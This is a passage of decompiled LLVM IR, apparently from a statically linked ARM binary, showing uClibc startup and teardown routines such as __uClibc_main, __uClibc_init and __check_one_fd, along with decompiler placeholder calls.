  br i1 %v9_1428c, label %dec_label_pc_14294, label %dec_label_pc_142ac

dec_label_pc_142a8:                               ; preds = %dec_label_pc_14294
  %v0_142a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_142a8, i32* @r3, align 4
  br label %dec_label_pc_142ac

dec_label_pc_142ac:                               ; preds = %dec_label_pc_1427c, %dec_label_pc_14294.dec_label_pc_14288_crit_edge, %dec_label_pc_142a8
  %v1_142b0 = phi i32 [ %v0_142a8, %dec_label_pc_142a8 ], [ %v2_1428835, %dec_label_pc_1427c ], [ %v2_14288, %dec_label_pc_14294.dec_label_pc_14288_crit_edge ]
  %v1_142ac = load i32, i32* %r6.global-to-local, align 4
  %v3_142ac = icmp uge i32 %v1_142b0, %v1_142ac
  store i1 %v3_142ac, i1* %cpsr_c.global-to-local, align 1
  %v9_142ac = icmp eq i32 %v1_142b0, %v1_142ac
  br i1 %v9_142ac, label %dec_label_pc_142b8, label %bb

bb:                                               ; preds = %dec_label_pc_142ac
  store i32 %v1_142b0, i32* %r6.global-to-local, align 4
  %v1_14270 = or i32 %v1_142b0, 2
  store i32 %v1_14270, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14274 = icmp eq i32 %v1_14270, %v1_142b0
  br i1 %v9_14274, label %dec_label_pc_14320, label %bb.dec_label_pc_1427c_crit_edge

bb.dec_label_pc_1427c_crit_edge:                  ; preds = %bb
  %v0_14280.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1427c

dec_label_pc_142b8:                               ; preds = %dec_label_pc_142ac
  %v0_142b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_142b8 = and i32 %v0_142b8, -69
  store i32 %v1_142b8, i32* @r3, align 4
  %v2_142bc = icmp ugt i32 %v1_142b8, 9
  store i1 %v2_142bc, i1* %cpsr_c.global-to-local, align 1
  %v7_142bc = icmp eq i32 %v1_142b8, 10
  br i1 %v7_142bc, label %dec_label_pc_142c4, label %dec_label_pc_14320

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142b8
  %v1_142c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_142c8 = add i32 %v1_142c8, 544
  %v3_142c8 = inttoptr i32 %v2_142c8 to i32*
  store i32 -1, i32* %v3_142c8, align 4
  %v0_142cc = load i32, i32* @r2, align 4
  store i32 %v0_142cc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_142d0:                               ; preds = %dec_label_pc_14304.dec_label_pc_142d0_crit_edge, %dec_label_pc_142c4
  %v0_142d4 = phi i32 [ %v0_142d4.pre, %dec_label_pc_14304.dec_label_pc_142d0_crit_edge ], [ %v0_142cc, %dec_label_pc_142c4 ]
  %v0_142d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_142d0 = add i32 %v0_142d0, 132
  %v2_142d0 = inttoptr i32 %v1_142d0 to i32*
  %v3_142d0 = load i32, i32* %v2_142d0, align 4
  store i32 %v0_142d4, i32* @r2, align 4
  store i32 %v3_142d0, i32* %r4.global-to-local, align 4
  %v1_142dc = or i32 %v3_142d0, 16
  store i32 %v1_142dc, i32* @r1, align 4
  %v1_142e022 = inttoptr i32 %v0_142d4 to i32*
  %v2_142e023 = load i32, i32* %v1_142e022, align 4
  %v3_142e425 = icmp uge i32 %v2_142e023, %v3_142d0
  store i1 %v3_142e425, i1* %cpsr_c.global-to-local, align 1
  %v9_142e431 = icmp eq i32 %v2_142e023, %v3_142d0
  br i1 %v9_142e431, label %dec_label_pc_142ec, label %dec_label_pc_14304

dec_label_pc_142ec:                               ; preds = %dec_label_pc_142d0, %dec_label_pc_142ec.dec_label_pc_142e0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_142fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_142fc, label %dec_label_pc_14300, label %dec_label_pc_142ec.dec_label_pc_142e0_crit_edge

dec_label_pc_142ec.dec_label_pc_142e0_crit_edge:  ; preds = %dec_label_pc_142ec
  %v0_142e0.pre = load i32, i32* @r2, align 4
  %v1_142e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_142e0 = inttoptr i32 %v0_142e0.pre to i32*
  %v2_142e0 = load i32, i32* %v1_142e0, align 4
  %v3_142e4 = icmp uge i32 %v2_142e0, %v1_142e4.pre
  store i1 %v3_142e4, i1* %cpsr_c.global-to-local, align 1
  %v9_142e4 = icmp eq i32 %v2_142e0, %v1_142e4.pre
  br i1 %v9_142e4, label %dec_label_pc_142ec, label %dec_label_pc_14304

dec_label_pc_14300:                               ; preds = %dec_label_pc_142ec
  %v0_14300 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %dec_label_pc_142d0, %dec_label_pc_142ec.dec_label_pc_142e0_crit_edge, %dec_label_pc_14300
  %v0_14304 = phi i32 [ %v0_14300, %dec_label_pc_14300 ], [ %v2_142e023, %dec_label_pc_142d0 ], [ %v2_142e0, %dec_label_pc_142ec.dec_label_pc_142e0_crit_edge ]
  %v1_14304 = phi i32 [ %v0_14300, %dec_label_pc_14300 ], [ %v3_142d0, %dec_label_pc_142d0 ], [ %v1_142e4.pre, %dec_label_pc_142ec.dec_label_pc_142e0_crit_edge ]
  %v3_14304 = icmp uge i32 %v0_14304, %v1_14304
  store i1 %v3_14304, i1* %cpsr_c.global-to-local, align 1
  %v9_14304 = icmp eq i32 %v0_14304, %v1_14304
  br i1 %v9_14304, label %dec_label_pc_1430c, label %dec_label_pc_14304.dec_label_pc_142d0_crit_edge

dec_label_pc_14304.dec_label_pc_142d0_crit_edge:  ; preds = %dec_label_pc_14304
  %v0_142d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_142d0

dec_label_pc_1430c:                               ; preds = %dec_label_pc_14304
  store i32 116, i32* @r3, align 4
  %v0_14314 = load i32, i32* %r8.global-to-local, align 4
  %v2_14314 = add i32 %v0_14314, 116
  %v3_14314 = inttoptr i32 %v2_14314 to i32*
  %v4_14314 = load i32, i32* %v3_14314, align 4
  store i32 %v4_14314, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14314)
  %v0_14320.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %entry, %bb, %dec_label_pc_142b8, %dec_label_pc_1430c
  %v0_14320 = phi i32 [ %v1_142b0, %dec_label_pc_142b8 ], [ %v0_14320.pre, %dec_label_pc_1430c ], [ %v3_14264, %entry ], [ %v1_142b0, %bb ]
  %v2_14324 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14324, i32* @r4, align 4
  ret i32 %v0_14320

; uselistorder directives
  uselistorder i32 %v0_14300, { 1, 0 }
  uselistorder i32 %v1_142e4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14270, { 1, 2, 0 }
  uselistorder i32 %v1_142ac, { 1, 0 }
  uselistorder i32 %v1_142b0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1428c.pre, { 1, 0 }
  uselistorder i32 %v0_1428450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 2, 1 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14320, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142ec, { 1, 0 }
  uselistorder label %dec_label_pc_142ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14294, { 1, 0 }
  uselistorder label %dec_label_pc_1427c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14344 = add i32 %tmp, 4
  %v4_14344 = inttoptr i32 %v3_14344 to i32*
  store i32 %arg3, i32* %v4_14344, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14350 = icmp eq i32 %arg2, 0
  br i1 %v2_14350, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14368 = call i32 @__libc_errno()
  ret i32 %v3_14368

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1439c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14378 = load i32, i32* @r4, align 4
  store i32 %v3_14378, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %dec_label_pc_1439c.dec_label_pc_1439c_crit_edge, %dec_label_pc_1439c.lr.ph
  %v1_1439c = phi i32 [ %v1_143a8, %dec_label_pc_1439c.dec_label_pc_1439c_crit_edge ], [ 0, %dec_label_pc_1439c.lr.ph ]
  %v0_1439c = phi i32 [ %v0_1439c.pre, %dec_label_pc_1439c.dec_label_pc_1439c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -8), %dec_label_pc_1439c.lr.ph ]
  %v4_1439c = mul i32 %v1_1439c, 4
  %v5_1439c = add i32 %v4_1439c, %v0_1439c
  %v6_1439c = inttoptr i32 %v5_1439c to i32*
  %v7_1439c = load i32, i32* %v6_1439c, align 4
  call void @__pseudo_branch(i32 %v7_1439c)
  %v0_143a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_143a8 = add i32 %v0_143a8, -1
  store i32 %v1_143a8, i32* %r4.global-to-local, align 4
  %v2_143a8 = icmp eq i32 %v0_143a8, 0
  br i1 %v2_143a8, label %dec_label_pc_143b0, label %dec_label_pc_1439c.dec_label_pc_1439c_crit_edge

dec_label_pc_1439c.dec_label_pc_1439c_crit_edge:  ; preds = %dec_label_pc_1439c
  %v0_1439c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1439c

dec_label_pc_143b0:                               ; preds = %dec_label_pc_1439c
  %v0_143b4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_143b4 = add i32 %v0_143b4.pre, 2004
  %v3_143b4 = inttoptr i32 %v2_143b4 to i32*
  %v4_143b4 = load i32, i32* %v3_143b4, align 4
  %v2_143b8 = icmp eq i32 %v4_143b4, 0
  br i1 %v2_143b8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_143b0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_143b0, %bb
  %v2_143c0 = xor i1 %v2_143b8, true
  call void @__pseudo_cond_branch(i1 %v2_143c0, i32 %v4_143b4)
  %v0_143c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143c8 = add i32 %v0_143c8, 2008
  %v3_143c8 = inttoptr i32 %v2_143c8 to i32*
  %v4_143c8 = load i32, i32* %v3_143c8, align 4
  %v2_143cc = icmp eq i32 %v4_143c8, 0
  br i1 %v2_143cc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_143d4 = xor i1 %v2_143cc, true
  call void @__pseudo_cond_branch(i1 %v2_143d4, i32 %v4_143c8)
  %v2_143d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_143d8, i32* %r4.global-to-local, align 4
  %v1_143dc = load i32, i32* @r0, align 4
  ret i32 %v1_143dc

; uselistorder directives
  uselistorder i32 %v1_143a8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_143f4 = load i32, i32* @r4, align 4
  %v6_143f4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14408 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14410 = icmp eq i32 %v2_14408, -1
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r3, align 4
  br i1 %v3_14410, label %dec_label_pc_1441c, label %dec_label_pc_14434

dec_label_pc_1441c:                               ; preds = %entry
  %v0_14420 = load i32, i32* @r5, align 4
  %v2_14428 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33916), i32 %v0_14420)
  %v1_1442c = load i32, i32* @r4, align 4
  %v1_14430 = icmp ne i32 %v2_14428, %v1_1442c
  call void @__pseudo_cond_branch(i1 %v1_14430, i32 ptrtoint (i32* @global_var_12d50.501 to i32))
  br label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %entry, %dec_label_pc_1441c
  %v1_1443c = phi i32 [ %v2_14408, %entry ], [ %v2_14428, %dec_label_pc_1441c ]
  store i32 %v3_143f4, i32* @r4, align 4
  store i32 %v6_143f4, i32* @r5, align 4
  ret i32 %v1_1443c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14434, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14448 = load i32, i32* @r4, align 4
  store i32 %v3_14448, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r4.global-to-local, align 4
  %v4_14458 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 148) to i32*), align 4
  %v1_1445c = inttoptr i32 %v4_14458 to i32*
  %v2_1445c = load i32, i32* %v1_1445c, align 4
  %v2_14460 = icmp eq i32 %v2_1445c, 0
  br i1 %v2_14460, label %dec_label_pc_14468, label %dec_label_pc_1448c

dec_label_pc_14468:                               ; preds = %entry
  store i32 4096, i32* %v1_1445c, align 4
  %v0_14470 = call i32 @__pthread_initialize_minimal()
  %v0_14478 = load i32, i32* %r4.global-to-local, align 4
  %v2_14478 = add i32 %v0_14478, -47744
  %v2_14480 = icmp eq i32 %v2_14478, 0
  br i1 %v2_14480, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14468
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14468, %bb
  %v2_14488 = xor i1 %v2_14480, true
  call void @__pseudo_cond_branch(i1 %v2_14488, i32 %v2_14478)
  %v2_1448c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1448c

dec_label_pc_1448c:                               ; preds = %entry, %bb4
  %v2_1448c = phi i32 [ %v2_1448c.pre, %bb4 ], [ %v3_14448, %entry ]
  %.0 = phi i32 [ %v0_14470, %bb4 ], [ undef, %entry ]
  store i32 %v2_1448c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1448c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53716, i32* %r4.global-to-local, align 4
  %v1_144ac = add i32 %tmp, 4
  store i32 %v1_144ac, i32* %ip.global-to-local, align 4
  %v2_144b0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r4.global-to-local, align 4
  %v3_144bc = mul i32 %arg2, 4
  store i32 %v3_144bc, i32* @r7, align 4
  %v4_144c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 24) to i32*), align 4
  store i32 %v4_144c4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_144cc = add i32 %v1_144ac, %v3_144bc
  store i32 %v2_144cc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %stack_var_-416, align 4
  %v4_144d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 56) to i32*), align 4
  store i32 %v4_144d4, i32* %r4.global-to-local, align 4
  %v3_144d8 = icmp uge i32 %v2_144cc, %v2_144b0
  store i1 %v3_144d8, i1* %cpsr_c.global-to-local, align 1
  %v9_144d8 = icmp eq i32 %v2_144cc, %v2_144b0
  store i1 %v9_144d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_144e0 = inttoptr i32 %v4_144d4 to i32*
  store i32 %v2_144cc, i32* %v2_144e0, align 4
  br i1 %v9_144d8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_144e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_144e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_144e8 = inttoptr i32 %v1_144e8 to i32*
  store i32 %v0_144e8, i32* %v2_144e8, align 4
  %v2_144ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_144ec, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_144f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_144f8, i32* @r6, align 4
  br i1 %v9_144d8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1450053 = add i32 %v2_144ec, 2008
  %v4_1450054 = inttoptr i32 %v3_1450053 to i32*
  store i32 %arg6, i32* %v4_1450054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_144fc = load i32, i32* %ip.global-to-local, align 4
  %v2_144fc = load i32, i32* @r7, align 4
  %v3_144fc = add i32 %v2_144fc, %v1_144fc
  store i32 %v3_144fc, i32* %r3.global-to-local, align 4
  %v3_1450050 = add i32 %v2_144ec, 2008
  %v4_1450051 = inttoptr i32 %v3_1450050 to i32*
  store i32 %arg6, i32* %v4_1450051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1450c = load i32, i32* %r3.global-to-local, align 4
  %v2_1450c = load i32, i32* %r4.global-to-local, align 4
  %v3_1450c = inttoptr i32 %v2_1450c to i32*
  store i32 %v1_1450c, i32* %v3_1450c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14510 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14510, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14518 = bitcast i32* %stack_var_-120 to i8*
  %v4_14518 = call i32 @__GI_memset(i8* %v3_14518, i32 0, i32 120)
  store i32 %v4_14518, i32* %r0.global-to-local, align 4
  %v0_1451c = load i32, i32* %r4.global-to-local, align 4
  %v1_1451c = inttoptr i32 %v0_1451c to i32*
  %v2_1451c = load i32, i32* %v1_1451c, align 4
  br label %dec_label_pc_14528

dec_label_pc_14528:                               ; preds = %dec_label_pc_14528, %bb77
  %storemerge = phi i32 [ %v2_1451c, %bb77 ], [ %v1_14534, %dec_label_pc_14528 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14528 = inttoptr i32 %storemerge to i32*
  %v2_14528 = load i32, i32* %v1_14528, align 4
  store i32 %v2_14528, i32* %r3.global-to-local, align 4
  %v2_1452c = icmp eq i32 %v2_14528, 0
  %v1_14534 = add i32 %storemerge, 4
  br i1 %v2_1452c, label %dec_label_pc_14534, label %dec_label_pc_14528

dec_label_pc_14534:                               ; preds = %dec_label_pc_14528
  store i32 %v1_14534, i32* @r4, align 4
  store i32 %v2_14510, i32* @r5, align 4
  %v1_1455830 = inttoptr i32 %v1_14534 to i32*
  %v2_1455831 = load i32, i32* %v1_1455830, align 4
  store i32 %v2_1455831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1455c33 = icmp eq i32 %v2_1455831, 0
  store i1 %v2_1455c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1455c33, label %dec_label_pc_14564, label %dec_label_pc_14540

dec_label_pc_14540:                               ; preds = %dec_label_pc_14534, %dec_label_pc_14558
  %v4_14548 = phi i32 [ %v1_14554, %dec_label_pc_14558 ], [ %v1_14534, %dec_label_pc_14534 ]
  %v5_14544 = phi i32 [ %v2_14558, %dec_label_pc_14558 ], [ %v2_1455831, %dec_label_pc_14534 ]
  %v2_14540 = icmp ugt i32 %v5_14544, 13
  store i1 %v2_14540, i1* %cpsr_c.global-to-local, align 1
  %v7_14540 = icmp eq i32 %v5_14544, 14
  store i1 %v7_14540, i1* %cpsr_z.global-to-local, align 1
  %v2_14544 = xor i1 %v2_14540, true
  %v3_14544 = or i1 %v7_14540, %v2_14544
  br i1 %v3_14544, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_14540
  %v4_14544 = load i32, i32* @r5, align 4
  %v6_14544 = and i32 %v5_14544, 536870912
  %v7_14544 = icmp ne i32 %v6_14544, 0
  store i1 %v7_14544, i1* %cpsr_c.global-to-local, align 1
  %v8_14544 = mul i32 %v5_14544, 8
  %v9_14544 = add i32 %v4_14544, %v8_14544
  store i32 %v9_14544, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14540, %bb78
  %v1_14550 = phi i1 [ %v2_14540, %dec_label_pc_14540 ], [ %v7_14544, %bb78 ]
  %v2_14548 = xor i1 %v1_14550, true
  %v3_14548 = or i1 %v7_14540, %v2_14548
  br i1 %v3_14548, label %bb80, label %dec_label_pc_14558

bb80:                                             ; preds = %bb79
  store i32 %v4_14548, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14558

dec_label_pc_14558:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_14548, i32 ptrtoint (i32* @global_var_111c0.509 to i32))
  %v0_14554 = load i32, i32* @r4, align 4
  %v1_14554 = add i32 %v0_14554, 8
  store i32 %v1_14554, i32* @r4, align 4
  %v1_14558 = inttoptr i32 %v1_14554 to i32*
  %v2_14558 = load i32, i32* %v1_14558, align 4
  store i32 %v2_14558, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1455c = icmp eq i32 %v2_14558, 0
  store i1 %v2_1455c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1455c, label %dec_label_pc_14564, label %dec_label_pc_14540

dec_label_pc_14564:                               ; preds = %dec_label_pc_14558, %dec_label_pc_14534
  store i32 %v2_14510, i32* %r0.global-to-local, align 4
  %v1_14568 = call i32 @_dl_aux_init(i32 %v2_14510)
  store i32 %v1_14568, i32* %r0.global-to-local, align 4
  %v1_1456c = call i32 @__GI___uClibc_init(i32 %v1_14568)
  store i32 %v1_1456c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14574 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14574, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1457c = add i32 %v2_14574, 148
  %v3_1457c = inttoptr i32 %v2_1457c to i32*
  %v4_1457c = load i32, i32* %v3_1457c, align 4
  store i32 %v4_1457c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14584 = icmp eq i32 %tmp66, 0
  store i1 %v2_14584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14584, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14564
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14564, %bb81
  %v0_14590 = phi i32 [ %tmp66, %dec_label_pc_14564 ], [ 4096, %bb81 ]
  %v3_1458c = icmp eq i32 %tmp65, -1
  store i1 %v3_1458c, i1* %cpsr_c.global-to-local, align 1
  %v8_1458c = icmp eq i32 %tmp65, -1
  store i1 %v8_1458c, i1* %cpsr_z.global-to-local, align 1
  %v2_14590 = inttoptr i32 %v4_1457c to i32*
  store i32 %v0_14590, i32* %v2_14590, align 4
  br i1 %v3_1458c, label %dec_label_pc_14598, label %dec_label_pc_145c0

dec_label_pc_14598:                               ; preds = %bb82
  %v0_14598 = call i32 @getuid()
  store i32 %v0_14598, i32* @r0, align 4
  store i32 %v0_14598, i32* %r4.global-to-local, align 4
  %v0_145a0 = call i32 @geteuid()
  store i32 %v0_145a0, i32* @r0, align 4
  %v3_145a4 = icmp uge i32 %v0_14598, %v0_145a0
  store i1 %v3_145a4, i1* %cpsr_c.global-to-local, align 1
  %v9_145a4 = icmp eq i32 %v0_14598, %v0_145a0
  store i1 %v9_145a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_145a4, label %dec_label_pc_145ac, label %dec_label_pc_145e8

dec_label_pc_145ac:                               ; preds = %dec_label_pc_14598
  %v1_145ac = call i32 @getgid(i32 %v0_145a0)
  store i32 %v1_145ac, i32* @r0, align 4
  store i32 %v1_145ac, i32* %r4.global-to-local, align 4
  %v0_145b4 = call i32 @getegid()
  store i32 %v0_145b4, i32* %r0.global-to-local, align 4
  %v3_145b8 = icmp uge i32 %v1_145ac, %v0_145b4
  store i1 %v3_145b8, i1* %cpsr_c.global-to-local, align 1
  %v9_145b8 = icmp eq i32 %v1_145ac, %v0_145b4
  store i1 %v9_145b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_145b8, label %dec_label_pc_145c0, label %dec_label_pc_145e8

dec_label_pc_145c0:                               ; preds = %dec_label_pc_145ac, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1458c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1458c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1458c, label %dec_label_pc_14610, label %dec_label_pc_145cc

dec_label_pc_145cc:                               ; preds = %dec_label_pc_145c0
  store i32 %tmp64, i32* @r3, align 4
  %v3_145d0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_145d0, i1* %cpsr_c.global-to-local, align 1
  %v9_145d0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_145d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_145d0, label %dec_label_pc_145d8, label %dec_label_pc_145e8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145cc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_145e0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_145e0, i1* %cpsr_c.global-to-local, align 1
  %v9_145e0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_145e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_145e0, label %dec_label_pc_14610, label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145cc, %dec_label_pc_145ac, %dec_label_pc_14598, %dec_label_pc_145d8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_145f4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_145fc = load i32, i32* @r4, align 4
  store i32 %v0_145fc, i32* %r1.global-to-local, align 4
  %v2_14600 = call i32 @__check_one_fd(i32 1, i32 %v0_145fc)
  %v0_14604 = load i32, i32* @r4, align 4
  store i32 %v0_14604, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
